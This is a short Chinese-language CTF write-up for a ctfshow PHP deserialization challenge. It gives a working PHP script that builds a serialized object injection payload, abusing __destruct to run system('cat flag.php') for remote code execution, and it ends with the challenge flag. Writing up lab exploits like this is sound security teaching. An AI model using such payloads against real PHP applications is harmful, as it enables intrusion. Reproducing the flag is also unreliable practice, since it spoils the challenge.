这道题只需要修改class值为backDoor，触发__destruct魔术方法，从而调用getinfo函数，进行RCE。
```
<?php
class backDoor{
    private $code="system('cat flag.php');";

}
class ctfShowUser
{

    private $class;
    public function __construct(){
        $this->class= new backDoor();
    }
}
$c = new ctfShowUser();
echo urlencode(serialize($c));
```
flag : ctfshow{e33eafd5-3718-4e1c-abe4-2336cbdf8700}